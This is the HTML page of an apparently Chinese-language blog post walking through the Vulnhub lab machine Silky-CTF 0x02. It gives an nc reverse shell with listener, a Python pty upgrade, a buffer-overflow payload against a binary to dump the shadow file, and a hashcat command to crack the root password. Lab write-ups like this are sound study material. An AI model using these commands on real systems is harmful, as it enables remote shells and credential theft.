@@ -1,0 +1,394 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>silky：0x02靶机总结 | CrayBlog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Cray">
+    
+    <meta name="description" content="靶机靶机来源vulnhub
+下载 ova文件，VM 或 VB 都是可以直接打开的
+渗透具体可以详细可以参阅 YouTube
+我这里来记录下我的过程
+扫主机nmap 10.0.0.0/24我的是这个网段
+或者直接使用netdiscover进行主机发现，比不过比较慢
+我这里的靶机IP是10.0.0.14">
+    
+    
+    
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="CrayBlog" title="CrayBlog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="CrayBlog">CrayBlog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:L0yy.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/06/03/silky：0x02靶机总结/" title="silky：0x02靶机总结" itemprop="url">silky：0x02靶机总结</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://L0yy.github.io" title="Cray">Cray</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2019-06-03T10:20:56.000Z" itemprop="datePublished">2019-06-03</time>
+    更新日期:<time datetime="2019-08-25T11:54:08.152Z" itemprop="dateModified">2019-08-25</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#靶机"><span class="toc-number">1.</span> <span class="toc-text">靶机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透"><span class="toc-number">2.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#扫主机"><span class="toc-number">2.1.</span> <span class="toc-text">扫主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#后台路径遍历"><span class="toc-number">2.1.1.</span> <span class="toc-text">后台路径遍历</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#登陆页"><span class="toc-number">3.</span> <span class="toc-text">登陆页</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码执行"><span class="toc-number">4.</span> <span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一个有溢出的文件"><span class="toc-number">5.</span> <span class="toc-text">一个有溢出的文件</span></a></li></ol>
+		</div>
+		
+		<h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p>靶机来源<a href="https://www.vulnhub.com/entry/silky-ctf-0x02,307/" target="_blank" rel="noopener">vulnhub</a></p>
+<p>下载 ova文件，VM 或 VB 都是可以直接打开的</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>具体可以详细可以参阅 <a href="https://www.youtube.com/watch?v=CW93-st2kCI&t=174s" target="_blank" rel="noopener">YouTube</a></p>
+<p>我这里来记录下我的过程</p>
+<h3 id="扫主机"><a href="#扫主机" class="headerlink" title="扫主机"></a>扫主机</h3><p><code>nmap 10.0.0.0/24</code>我的是这个网段</p>
+<p>或者直接使用netdiscover进行主机发现，比不过比较慢</p>
+<p><strong>我这里的靶机IP是10.0.0.141</strong></p>
+<p>扫服务 <code>nmap -A 10.0.0.141</code> 扫出具体的端口及其服务。</p>
+<p>发现 22 端口和 80 直接访问80 </p>
+<p>打开看是一个登陆页面，随意点点看，有个登陆页</p>
+<h4 id="后台路径遍历"><a href="#后台路径遍历" class="headerlink" title="后台路径遍历"></a>后台路径遍历</h4><p><code>dirb http://10.0.0.141 /var/share/wordlists/dirb/common.txt</code></p>
+<p>没有扫出什么有用的，搞登陆页</p>
+<h2 id="登陆页"><a href="#登陆页" class="headerlink" title="登陆页"></a>登陆页</h2><p>弱口令试试，没发现什么。hydra 爆破 http有待学习，</p>
+<p>根据视频提示username 参数有代码执行</p>
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>这里直接上一个nc的反弹shell</p>
+<p><code>nc 10.0.0.141 8848 -t -e /bin/bash</code></p>
+<p>攻击机这边监听</p>
+<p><code>nc -lnvp 8848</code></p>
+<p>界面不好看，上一个python的pty</p>
+<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<h2 id="一个有溢出的文件"><a href="#一个有溢出的文件" class="headerlink" title="一个有溢出的文件"></a>一个有溢出的文件</h2><p>在/home/silky目录下有个cat_shad的文件，我们把它下载下来</p>
+<p><strong><code>python -m SimpleHTTPServer 8822</code></strong><br><em>SimpleHTTPServer这个是python自带的库，注意大小写</em></p>
+<p>下载好后，直接ida看一下，发现需要溢出覆盖参数 ‘a’* 0x40 + flag 这个flag就需要是 0x496C5962 由于是小端序所以我们的脚本要这样写</p>
+<p>python -c “print ‘a’*0x40 +’\x62\x59\x6c\x49’”,这样的结果是我们输入的结果了</p>
+<p>学习一下这个命令</p>
+<p><code>./cat_shadow $(python -c &quot;print &#39;a&#39;*0x40 +&#39;\x62\x59\x6c\x49&#39;&quot;)</code></p>
+<p>这样可以直接回显shadow文件，然后使用hashcat 爆破root 密码</p>
+<p><code>sudo hashcat --force -w 3 -a 0 -m 1800 --remove -o linux.out linux.int /usr/share/wordlists/rockyou.txt</code></p>
+<p>我虚拟机给的双核，10分钟就跑出来了</p>
+<p><a href="https://blog.werner.wiki/use-hashcat-crack-all-kinds-of-hash/" target="_blank" rel="noopener">hashcat学习地址</a></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/linux/">linux</a><a href="/tags/web渗透/">web渗透</a>
+  </div>
+
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/CTF/">CTF</a>
+</div>
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://L0yy.github.io/2019/06/03/silky：0x02靶机总结/" data-title="silky：0x02靶机总结 | CrayBlog" data-tsina="" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/06/10/WEB温习第一天/" title="web渗透基础一">
+  <strong>PREVIOUS:</strong><br/>
+  <span>
+  web渗透基础一</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/05/30/内存基础/"  title="内存基础">
+ <strong>NEXT:</strong><br/> 
+ <span>内存基础
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#靶机"><span class="toc-number">1.</span> <span class="toc-text">靶机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透"><span class="toc-number">2.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#扫主机"><span class="toc-number">2.1.</span> <span class="toc-text">扫主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#后台路径遍历"><span class="toc-number">2.1.1.</span> <span class="toc-text">后台路径遍历</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#登陆页"><span class="toc-number">3.</span> <span class="toc-text">登陆页</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码执行"><span class="toc-number">4.</span> <span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一个有溢出的文件"><span class="toc-number">5.</span> <span class="toc-text">一个有溢出的文件</span></a></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>7</sup></a></li>
+		
+			<li><a href="/categories/Docker/" title="Docker">Docker<sup>1</sup></a></li>
+		
+			<li><a href="/categories/Git/" title="Git">Git<sup>1</sup></a></li>
+		
+			<li><a href="/categories/博客/" title="博客">博客<sup>2</sup></a></li>
+		
+			<li><a href="/categories/课堂笔记/" title="课堂笔记">课堂笔记<sup>9</sup></a></li>
+		
+			<li><a href="/categories/逆向/" title="逆向">逆向<sup>4</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/Angr/" title="Angr">Angr<sup>1</sup></a></li>
+		
+			<li><a href="/tags/DVWA/" title="DVWA">DVWA<sup>2</sup></a></li>
+		
+			<li><a href="/tags/GCC/" title="GCC">GCC<sup>1</sup></a></li>
+		
+			<li><a href="/tags/HCIP/" title="HCIP">HCIP<sup>2</sup></a></li>
+		
+			<li><a href="/tags/IDA/" title="IDA">IDA<sup>1</sup></a></li>
+		
+			<li><a href="/tags/OD/" title="OD">OD<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Python/" title="Python">Python<sup>1</sup></a></li>
+		
+			<li><a href="/tags/SQL注入/" title="SQL注入">SQL注入<sup>1</sup></a></li>
+		
+			<li><a href="/tags/TCP/" title="TCP">TCP<sup>1</sup></a></li>
+		
+			<li><a href="/tags/TcpDump/" title="TcpDump">TcpDump<sup>1</sup></a></li>
+		
+			<li><a href="/tags/coding/" title="coding">coding<sup>1</sup></a></li>
+		
+			<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
+		
+			<li><a href="/tags/github/" title="github">github<sup>1</sup></a></li>
+		
+			<li><a href="/tags/git密钥生成以及安装/" title="git密钥生成以及安装">git密钥生成以及安装<sup>1</sup></a></li>
+		
+			<li><a href="/tags/hexo/" title="hexo">hexo<sup>2</sup></a></li>
+		
+			<li><a href="/tags/https/" title="https">https<sup>1</sup></a></li>
+		
+			<li><a href="/tags/hub/" title="hub">hub<sup>1</sup></a></li>
+		
+			<li><a href="/tags/linux/" title="linux">linux<sup>4</sup></a></li>
+		
+			<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
+		
+			<li><a href="/tags/retdec/" title="retdec">retdec<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<div class="social-font clearfix">
+		
+		
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2019 
+		
+		<a href="http://L0yy.github.io" target="_blank" title="Cray">Cray</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+
+
+
+  </body>
+</html>
